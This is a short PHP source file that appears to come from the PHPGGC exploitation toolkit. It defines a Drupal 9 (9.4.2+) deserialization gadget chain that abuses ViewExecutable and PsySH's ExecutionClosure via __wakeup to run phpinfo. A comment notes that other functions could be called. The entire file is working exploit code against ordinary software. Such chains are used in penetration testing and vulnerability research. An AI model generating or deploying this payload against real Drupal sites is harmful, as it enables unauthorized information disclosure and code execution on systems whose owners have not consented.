<?php

namespace GadgetChain\Drupal9;

class INFO1 extends \PHPGGC\GadgetChain\PHPInfo
{
    public static $version = '9.4.2+';
    public static $vector = '__wakeup';
    public static $author = 'mcdruid';
    public static $information =
        'This requires PsySH which is bundled with drush. It is common but not
        mandatory for drush to be installed along with Drupal core. Other PHP
        functions could be executed, but no parameters can be passed.';

    public function generate(array $parameters)
    {
        return (
            new \Drupal\views\ViewExecutable(
                new \Psy\ExecutionClosure('phpinfo'),
                new \Drupal\Views\DisplayPluginCollection(),
                new \Drupal\views\Plugin\views\display\DefaultDisplay()
            )
        );
    }
}
